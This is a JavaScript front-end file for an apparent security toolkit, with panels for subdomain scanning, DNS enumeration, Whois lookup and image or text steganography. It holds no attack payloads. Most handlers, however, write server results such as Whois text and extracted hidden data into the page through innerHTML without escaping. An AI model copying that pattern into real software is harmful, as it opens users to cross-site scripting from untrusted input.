async function scanSubdomains() {
    const target = document.getElementById('subdomain-target').value;
    
    if (!target) {
        showError('subdomain-results', 'Target domain is required');
        return;
    }
    
    showLoading('subdomain-results', 'Scanning subdomains...');
    
    try {
        const response = await fetch('/api/recon/subdomain-scan', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({domain: target})
        });
        
        const data = await response.json();
        const resultsDiv = document.getElementById('subdomain-results');
        
        if (data.error) {
            showError('subdomain-results', data.error);
            return;
        }
        
        let html = `
            <div class="result-box success">
                <div class="result-title">Subdomains Found: ${data.subdomains?.length || 0}</div>
        `;
        
        if (data.subdomains && data.subdomains.length > 0) {
            html += '<div style="margin-top: 15px;">';
            data.subdomains.forEach(sub => {
                html += `<div class="list-item">${sub}</div>`;
            });
            html += '</div>';
        }
        
        html += '</div>';
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('subdomain-results', 'Failed to scan subdomains: ' + error.message);
    }
}

// DNS Enumeration Panel
function createDNSEnumerationPanel() {
    return `
        <div class="tool-panel">
            <h2>[RECON] DNS Enumeration</h2>
            <p class="tool-description">Enumerate DNS records and information</p>
            <div class="tool-form">
                <div class="form-group">
                    <label>Target Domain</label>
                    <input type="text" id="dns-target" placeholder="example.com" value="">
                </div>
                <div class="form-group">
                    <label>Record Type</label>
                    <select id="dns-type">
                        <option value="A">A Record</option>
                        <option value="AAAA">AAAA Record</option>
                        <option value="MX">MX Record</option>
                        <option value="NS">NS Record</option>
                        <option value="TXT">TXT Record</option>
                        <option value="CNAME">CNAME Record</option>
                        <option value="all">All Records</option>
                    </select>
                </div>
                <button class="btn btn-primary" onclick="enumerateDNS()">Enumerate DNS</button>
            </div>
            <div id="dns-results"></div>
        </div>
    `;
}

async function enumerateDNS() {
    const target = document.getElementById('dns-target').value;
    const type = document.getElementById('dns-type').value;
    
    if (!target) {
        showError('dns-results', 'Target domain is required');
        return;
    }
    
    showLoading('dns-results', 'Enumerating DNS records...');
    
    try {
        const response = await fetch('/api/recon/dns-enum', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({domain: target, record_type: type})
        });
        
        const data = await response.json();
        const resultsDiv = document.getElementById('dns-results');
        
        if (data.error) {
            showError('dns-results', data.error);
            return;
        }
        
        let html = `
            <div class="result-box success">
                <div class="result-title">DNS Records</div>
        `;
        
        if (data.records) {
            Object.keys(data.records).forEach(recordType => {
                html += `<div style="margin-top: 15px;"><strong style="color: var(--accent-color);">${recordType}:</strong>`;
                data.records[recordType].forEach(record => {
                    html += `<div class="list-item">${record}</div>`;
                });
                html += '</div>';
            });
        }
        
        html += '</div>';
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('dns-results', 'Failed to enumerate DNS: ' + error.message);
    }
}

// Whois Lookup Panel
function createWhoisLookupPanel() {
    return `
        <div class="tool-panel">
            <h2>[RECON] Whois Lookup</h2>
            <p class="tool-description">Lookup domain registration and ownership information</p>
            <div class="tool-form">
                <div class="form-group">
                    <label>Target Domain or IP</label>
                    <input type="text" id="whois-target" placeholder="example.com or 192.168.1.1" value="">
                </div>
                <button class="btn btn-primary" onclick="lookupWhois()">Lookup Whois</button>
            </div>
            <div id="whois-results"></div>
        </div>
    `;
}

async function lookupWhois() {
    const target = document.getElementById('whois-target').value;
    
    if (!target) {
        showError('whois-results', 'Target domain or IP is required');
        return;
    }
    
    showLoading('whois-results', 'Looking up Whois information...');
    
    try {
        const response = await fetch('/api/recon/whois', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({target: target})
        });
        
        const data = await response.json();
        const resultsDiv = document.getElementById('whois-results');
        
        if (data.error) {
            showError('whois-results', data.error);
            return;
        }
        
        let html = `
            <div class="result-box success">
                <div class="result-title">Whois Information</div>
                <div class="result-content" style="margin-top: 15px; white-space: pre-wrap; font-family: 'JetBrains Mono', monospace;">
                    ${data.whois_info || 'No information available'}
                </div>
            </div>
        `;
        
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('whois-results', 'Failed to lookup Whois: ' + error.message);
    }
}

// Image Steganography Panel
function createImageSteganographyPanel() {
    return `
        <div class="tool-panel">
            <h2>[STEGO] Image Steganography</h2>
            <p class="tool-description">Hide and extract data from images</p>
            <div class="tool-form">
                <div class="form-group">
                    <label>Operation</label>
                    <select id="stego-operation" onchange="toggleStegoDataField()">
                        <option value="encode">Encode (Hide Data)</option>
                        <option value="decode">Decode (Extract Data)</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Image File Path</label>
                    <input type="text" id="stego-image" placeholder="/path/to/image.png" value="">
                </div>
                <div class="form-group" id="stego-data-group">
                    <label>Data to Hide</label>
                    <textarea id="stego-data" placeholder="Enter text to hide" rows="4"></textarea>
                </div>
                <button class="btn btn-primary" onclick="processSteganography()">Process</button>
            </div>
            <div id="stego-results"></div>
        </div>
    `;
}

function toggleStegoDataField() {
    const operation = document.getElementById('stego-operation').value;
    const dataGroup = document.getElementById('stego-data-group');
    if (dataGroup) {
        dataGroup.style.display = operation === 'encode' ? 'block' : 'none';
    }
}

async function processSteganography() {
    const operation = document.getElementById('stego-operation').value;
    const imagePath = document.getElementById('stego-image').value;
    const data = document.getElementById('stego-data').value;
    
    if (!imagePath) {
        showError('stego-results', 'Image file path is required');
        return;
    }
    
    if (operation === 'encode' && !data) {
        showError('stego-results', 'Data to hide is required');
        return;
    }
    
    showLoading('stego-results', operation === 'encode' ? 'Encoding data...' : 'Decoding data...');
    
    try {
        const response = await fetch('/api/stego/image', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({operation, image_path: imagePath, data})
        });
        
        const result = await response.json();
        const resultsDiv = document.getElementById('stego-results');
        
        if (result.error) {
            showError('stego-results', result.error);
            return;
        }
        
        let html = `
            <div class="result-box success">
                <div class="result-title">${operation === 'encode' ? 'Data Encoded' : 'Data Extracted'}</div>
        `;
        
        if (operation === 'encode') {
            html += `<div class="result-row"><span class="result-label">Output File:</span><span class="result-value">${result.output_file || imagePath}</span></div>`;
        } else {
            html += `<div class="result-content" style="margin-top: 15px; font-family: 'JetBrains Mono', monospace;">${result.extracted_data || 'No data found'}</div>`;
        }
        
        html += '</div>';
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('stego-results', 'Failed to process: ' + error.message);
    }
}

// Text Steganography Panel
function createTextSteganographyPanel() {
    return `
        <div class="tool-panel">
            <h2>[STEGO] Text Steganography</h2>
            <p class="tool-description">Hide and extract data from text files</p>
            <div class="tool-form">
                <div class="form-group">
                    <label>Operation</label>
                    <select id="text-stego-operation" onchange="toggleTextStegoDataField()">
                        <option value="encode">Encode (Hide Data)</option>
                        <option value="decode">Decode (Extract Data)</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Text File Path</label>
                    <input type="text" id="text-stego-file" placeholder="/path/to/text.txt" value="">
                </div>
                <div class="form-group" id="text-stego-data-group">
                    <label>Data to Hide</label>
                    <textarea id="text-stego-data" placeholder="Enter text to hide" rows="4"></textarea>
                </div>
                <button class="btn btn-primary" onclick="processTextSteganography()">Process</button>
            </div>
            <div id="text-stego-results"></div>
        </div>
    `;
}

function toggleTextStegoDataField() {
    const operation = document.getElementById('text-stego-operation').value;
    const dataGroup = document.getElementById('text-stego-data-group');
    if (dataGroup) {
        dataGroup.style.display = operation === 'encode' ? 'block' : 'none';
    }
}

async function processTextSteganography() {
    const operation = document.getElementById('text-stego-operation').value;
    const filePath = document.getElementById('text-stego-file').value;
    const data = document.getElementById('text-stego-data').value;
    
    if (!filePath) {
        showError('text-stego-results', 'Text file path is required');
        return;
    }
    
    if (operation === 'encode' && !data) {
        showError('text-stego-results', 'Data to hide is required');
        return;
    }
    
    showLoading('text-stego-results', operation === 'encode' ? 'Encoding data...' : 'Decoding data...');
    
    try {
        const response = await fetch('/api/stego/text', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({operation, file_path: filePath, data})
        });
        
        const result = await response.json();
        const resultsDiv = document.getElementById('text-stego-results');
        
        if (result.error) {
            showError('text-stego-results', result.error);
            return;
        }
        
        let html = `
            <div class="result-box success">
                <div class="result-title">${operation === 'encode' ? 'Data Encoded' : 'Data Extracted'}</div>
        `;
        
        if (operation === 'encode') {
            html += `<div class="result-row"><span class="result-label">Output File:</span><span class="result-value">${result.output_file || filePath}</span></div>`;
        } else {
            html += `<div class="result-content" style="margin-top: 15px; font-family: 'JetBrains Mono', monospace;">${result.extracted_data || 'No data found'}</div>`;
        }
        
        html += '</div>';
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('text-stego-results', 'Failed to process: ' + error.message);
    }
}

// Close modals when clicking outside
window.addEventListener('click', function(event) {
    const tipsModal = document.getElementById('tips-modal');
    const aboutModal = document.getElementById('about-modal');
    
    if (event.target === tipsModal) {
        tipsModal.classList.remove('show');
    }
    if (event.target === aboutModal) {
        aboutModal.classList.remove('show');
    }
});
